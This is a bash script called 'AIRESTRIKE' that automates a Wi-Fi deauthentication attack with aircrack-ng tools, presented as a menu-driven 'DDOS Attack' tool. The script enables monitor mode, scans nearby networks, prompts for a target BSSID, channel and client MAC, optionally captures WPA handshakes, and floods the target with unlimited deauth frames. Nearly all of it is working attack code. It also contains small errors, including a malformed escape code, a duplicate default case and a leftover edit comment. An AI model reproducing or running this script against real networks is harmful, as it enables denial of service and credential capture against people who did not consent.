#!/bin/bash

# Path to the apt update timestamp file
TIMESTAMP_FILE="/var/lib/apt/periodic/apt-update-timestamp"

# Define threshold in seconds (e.g., 86400 seconds = 24 hours)
UPDATE_INTERVAL=86400

# Get current time
NOW=$(date +%s)

# Get the last update time (defaults to 0 if the file doesn't exist)
if [ -f "$TIMESTAMP_FILE" ]; then
    LAST_UPDATE=$(stat -c %Y "$TIMESTAMP_FILE")
else
    LAST_UPDATE=0
fi

# Check if the cache is older than the interval
if [ $((NOW - LAST_UPDATE)) -gt $UPDATE_INTERVAL ]; then
    echo "Package Cache Is Outdated!..Updating package list..."
    sudo apt update
    # Touch timestamp file to mark the last check
    sudo touch "$TIMESTAMP_FILE"
else
    echo "Package Cache Is Up To Date!..Skipping update..."
fi

# Dependency check
for pkg in figlet lolcat pv fastfetch aircrack-ng; do if ! command -v $pkg &>/dev/null; then 
echo "Installing $pkg..."
sudo apt install $pkg -y 
fi 
done

clear

# Ensure figlet is installed
command -v figlet >/dev/null 2>&1 || apt install figlet -y
clear
echo -e "\033[1;34m****=====================================================!!!\033[0m" 
 echo -e "\033[1;31m" 
  figlet -f slant "AIRESTRIKE" 
  echo -e "\033[0m"
  echo -e "\033[1;32mMODDED BY H4CKER\033[0m" | pv -qL 60
echo -e "\033[1;34m****=====================================================!!!\033[0m"

# Space

# Metadata
echo -e "\033[1;34m****=====================================================!!!\033[0m" 
echo -e "\033[1;36m Author :\033[0m H4CKER" 
echo -e "\033[1;36m Version :\033[0m 3.O"
echo -e "\033[1;36m GitHub :\033[0m https://github.com/Electroxcz"
echo -e "\033[1;34m!!!=====================================================****\033[0m" 
echo -e "\n"

echo -e "\033[1;31m|PLEASE ENSURE THAT YOR WIFI CARD IS SUPPORTED & WLAN KEY IS SET TO ZERO & YOUR WIFI CARD IS TURNED ON| \033[0m" | pv -qL 50

echo -e "\033[1;32mWELCOME TO THE WORLD OF MODERN NETWORKING & CYBERSECURITY PENETRATION TESTING\033[0m" | pv -qL 50

# Space

# Menu
echo -e "\e[36m[I]Start DDOS Attack          \e[36m[II]Stop DDOS Attack          \e[36m[E]EXIT" | pv -qL 50

# Space

echo -e -n "\033[1;33m| Please Choose An Option:\033[0m "
read SELECT


case $SELECT in


  I) echo -e "\033[1;32m|...Starting Network DDOS Attack...|\033[0m" | pv -qL 20 
  sleep 3

sudo fastfetch
sleep 2
sudo airmon-ng check kill
sleep 1
sudo iw dev
sleep 1
if ip link show wlan0mon >/dev/null 2>&1; then
    echo -e "\033[1;32m |>>>[+] Wlan0mon Is Already In Monitor Mode!..Proceeding...|\033[0m"
elif ip link show wlan0 >/dev/null 2>&1; then
    echo -e "\033[1;31m |>>>[+] Enabling monitor mode on wlanX...|\033[0m"
   sudo airmon-ng start wlan0
else
    echo -e "\033[1;31m |:::[-] Error: Neither wlan[X] nor wlan[X]mon was found!:::|\033[0m"
    exit 1
fi
sleep 4
sudo airmon-ng check kill
sleep 1
sudo airodump-ng --band abg wlan0mon
sleep 3

# Validate BSSID input
while true; do
    echo -e -n "\033[1;33m |Enter the Target BSSID: \033[0m"
    read bssid
    if [[ $bssid =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
        break
    else
        echo -e "\033[1;31m |:::Invalid BSSID format. Example format: AA:BX:CC:DX:XX:FF [Where X is Constant]:::|\033[0m"
    fi
done

# Validate Channel input
while true; do
    echo -e -n "\033[1;33m |Enter The Target Channel (1-173):\033[0m "
    read channel
    if [[ $channel =~ ^[0-9]+$ ]] && [ "$channel" -ge 0 ] && [ "$channel" -le 174 ]; then
        break
    else
        echo -e -n "\031[1;31m |:::Invalid channel number! Please enter a number between 1 and 173!:::|\033[0m"
    fi
done

# Validate Client MAC input (Optional)
while true; do
    echo -e -n "\033[1;33m |Enter the Target MAC (or press Enter for all):\033[0m "
    read mac
    if [[ -z "$mac" || $mac =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
    break

    else
        echo -e -n "\033[1;31m |:::Invalid MAC address format. Example format: AA:BX:CC:DX:XX:FF [Where X is Constant]:::|\033[0m"
    fi
done

# Execution of Deauthentication Attack

echo -e "\033[1;32m |...Sniffing The Target On The Specified Channel [if Mac] & Mac...|\033[1;33m"
sleep 1

# Space
    echo -e -n "\033[1;33m |Do You Want To Capture Handshake File? (Press "Y" To Continue OR "N" To Omit):\033[0m "
    read -r handshake
if
  [ "$handshake" = "Y" ] || [ "$handshake" = "y" ]; then

                    sudo airodump-ng --bssid $bssid --channel $channel --write $handshake wlan0mon

# Relaunch

bash airestrike.sh

elif
    [ "$handshake" = "N" ] || [ "$handshake" = "n" ]; then

                    sudo airodump-ng --bssid $bssid --channel $channel wlan0mon
               
else
    echo -e "\033[1;31m|...Invalid Input Please Enter ["Y" OR "N"]...|\033[1;33m"

fi



while true; do

    echo -e -n "\033[1;33m |How Many Deauth Packets You Want To Send To The Victim? (Press Enter For Unlimited OR Specify [Numerically] For Custom Acks):\033[0m "
    read -r deauth
if
  [ -z "$deauth" ] && [ -z "$mac" ]; then

                    sudo aireplay-ng --deauth 0 -a $bssid wlan0mon 

                                           break
elif
    [ -z "$deauth" ] && [ -n "$mac" ]; then
                    sudo aireplay-ng --deauth 0 -a $bssid -c $mac wlan0mon

                                           break

else
                    sudo aireplay-ng --deauth $deauth -a $bssid wlan0mon
                                           break
fi

done

sleep 3

# Relaunch

clear

echo -e "\033[1;32m"
echo -e "\033[1;32m |...Continue...|\033[0m" | pv -qL 30 
echo -e "\033[0m"
echo -e "\n\033[1;33m |...Entering The Main Menu...|\033[0m" | pv -qL 20 

bash airestrike.sh

;;

 II) echo -e "\033[1;32m|...Terminating Network DDOS Attack...|\033[0m" | pv -qL 20 
    sleep 3

sudo iw dev
sudo airmon-ng check kill
sleep 1
sudo airmon-ng stop wlan0mon
sleep 1
echo -e "\033[1;32m |>>>[+]Wifi [Card/Adapter] Is Set To Managed Mode<<<|\033[0m"
sudo systemctl restart NetworkManager.service
echo -e "\033[1;32m |>>>[+]Restarting Network Manager && Establishing Existing Internet Connection<<<|\033[0m"
sleep 3
sudo iw dev
sleep 4
clear

echo -e "\033[1;32m" | pv -qL 20 
echo -e "\033[1;32m |>>>Activating Peaceful Mode...|\033[0m" | pv -qL 20 
echo -e "\033[1;32m |...Operation Complete!...|\033[0m" | pv -qL 20
echo -e "\033[0m" | pv -qL 20
echo -e "\n\033[1;33m |...Entering The Main Menu...\033[0m" | pv -qL 20 
bash airestrike.sh

  ;;

# ... [Keep other cases unchanged] ...

    E)
      clear
      echo -e "\033[1;32m |<<<Thank you for using AireStrike!>>>|\033[0m" | pv -qL 20
      echo -e "\033[1;33m ||Created by H4CKER from ANON||\033[0m" | pv -qL 20
      echo -e "\033[1;33m |Follow on GitHub for updates!...|\033[0m" | pv -qL 20
      echo -e "\033[1;33m |GOODBYE!...|\033[0m" | pv -qL 20
      clear
      exit 00
      
      ;;

    *)
      echo -e "\033[1;31m|Invalid Option|\033[0m" | pv -qL 20 
      sleep 1
      clear
      bash airestrike.sh
      
      ;;

   Q|q) echo -e "\n\033[1;32m |>>>Exiting AireStrike...|\033[0m" 
        clear
        exit 00
        clear

      ;;

   *) echo -e "\031[1;31m|Invalid Option|\033[0m"
      echo -e "\033[1;31|Entering The Main Menu|\033[0m"
      clear
      bash airestrike.sh

      ;;
esac
